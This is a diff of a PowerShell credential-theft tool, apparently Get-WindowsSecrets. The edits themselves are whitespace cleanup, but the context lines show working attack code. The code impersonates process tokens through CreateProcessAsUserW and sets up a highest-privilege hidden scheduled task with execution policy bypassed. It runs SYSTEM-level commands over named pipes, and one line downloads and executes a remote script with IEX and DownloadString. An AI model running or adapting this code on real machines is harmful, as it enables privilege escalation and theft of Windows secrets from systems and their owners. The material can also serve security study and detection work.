@@ -5899,10 +5899,10 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 												{
 													Break
 												}
-												
+
 												#IEX $cmd
 												($res = IEX $cmd) 2>&1>$Null
-												$res >> ''C:\Windows\Temp\test.txt'' 
+												$res >> ''C:\Windows\Temp\test.txt''
 											}
 											$reader.Close()
 											$systemPipeIn.Close()'
@@ -5912,23 +5912,23 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 						$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoExit -ExecutionPolicy Bypass -WindowStyle Hidden -Command $StartNamedPipes"
 						$MyTask = Register-ScheduledTask -TaskName $TaskName -User $User -Action $Action -RunLevel Highest -Force
 						Start-ScheduledTask $TaskName
-												
+
 						$systemPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','systemPipeIn','Out'
 						$systemPipeIn.Connect()
 						$systemWriter = New-Object System.IO.StreamWriter($systemPipeIn)
 						Write-Host ("[+] Connected to System Named Pipes")
 						Write-Host ("[+] Ask new System process to impersonate token and create Token Named Pipes" -f ($ProcID))
-						
+
 						$Command = 'IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/YRazafim/Get-WindowsSecrets/main/Get-WindowsSecrets.ps1")'
 						$systemWriter.WriteLine($Command)
 						$systemWriter.Flush()
-						
+
 						$Command = "ImpersonateToken -ProcID $ProcID -Method CreateProcessAsUser -IsSystem 'True' -ConnectTokenPipe 'False' -ImpersonateCommand 'Null'"
 						$systemWriter.WriteLine($Command)
 						$systemWriter.Flush()
-						
-						Write-Host ("[+] Connect to Token Named Pipes" -f ($ProcID))
-						
+
+						Write-Host ("[+] Connect to Token Named Pipes")
+
 						$tokenPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeIn','Out'
 						$tokenPipeOut = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeOut','In'
 						$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
@@ -5968,7 +5968,7 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 								Write-Host ($out)
 							}
 						}
-						
+
 						$tokenReader.Close()
 						$tokenWriter.Close()
 						$tokenPipeIn.Close()
@@ -6001,7 +6001,7 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 												{
 													Break
 												}
-												
+
 												($res = IEX $cmd) 2>&1>$Null
 												If ($res)
 												{
@@ -6027,7 +6027,7 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 											$writer.Close()
 											$tokenPipeIn.Close()
 											$tokenPipeOut.Close()'
-						
+
 						$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoExit -WindowStyle Hidden -ExecutionPolicy Bypass -Command $StartNamedPipes")
 						$Succeeded = [TokensAPI]::CreateProcessAsUserW($DupToken, 0, $CmdLinePtr, 0, 0, $False, 0, 0, 0, [ref]$lpStartupInfo, [ref]$lpProcessInformation)
 						If (-not $Succeeded)
@@ -6037,12 +6037,12 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 						Else
 						{
 							Write-Host ("[+] Successfully impersonated token of requested process ID with CreateProcessAsUserW()`n")
-							
+
 							<# Allow to directly interact with newly created process and wait It
 							$SpawnProc = Get-CIMInstance -ClassName win32_process -filter "parentprocessid = '$($([System.Diagnostics.Process]::GetCurrentProcess().Id))'" | Select ProcessId
 							Wait-Process -Id $SpawnProc.ProcessId
 							#>
-							
+
 							If ($ConnectTokenPipe -eq 'True')
 							{
 								$tokenPipeIn = new-object System.IO.Pipes.NamedPipeClientStream '.','tokenPipeIn','Out'
@@ -6050,7 +6050,7 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 								$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
 								$tokenReader = New-Object System.IO.StreamReader($tokenPipeOut)
 								$tokenWriter = New-Object System.IO.StreamWriter($tokenPipeIn)
-								
+
 								While ($True)
 								{
 									$Command = Read-Host -Prompt '$PS>'
@@ -6070,7 +6070,7 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 										Write-Host ($out)
 									}
 								}
-								
+
 								$tokenReader.Close()
 								$tokenWriter.Close()
 								$tokenPipeIn.Close()
@@ -6083,7 +6083,7 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 								$tokenPipeIn.Connect(); $tokenPipeOut.Connect()
 								$tokenReader = New-Object System.IO.StreamReader($tokenPipeOut)
 								$tokenWriter = New-Object System.IO.StreamWriter($tokenPipeIn)
-								
+
 								Write-Host ("[+] Executing command")
 								$tokenWriter.WriteLine($ImpersonateCommand)
 								$tokenWriter.Flush()
@@ -6093,7 +6093,7 @@ function ImpersonateToken($ProcID, $Method, $IsSystem, $ConnectTokenPipe, $Imper
 									$out = $res.Replace("||||||", "`n")
 									Write-Host ($out)
 								}
-								
+
 								$tokenReader.Close()
 								$tokenWriter.Close()
 								$tokenPipeIn.Close()
@@ -10584,7 +10584,7 @@ function Get-WindowsSecrets()
 
 	If ($ImpersonateTokenProcID)
 	{
-		
+
 		ImpersonateToken -ProcID $ImpersonateTokenProcID -Method $ImpersonateMethod -IsSystem $ImpersonateIsSystem -ConnectTokenPipe $ImpersonateConnectTokenPipe -ImpersonateCommand $ImpersonateCommand
 		return
 	}
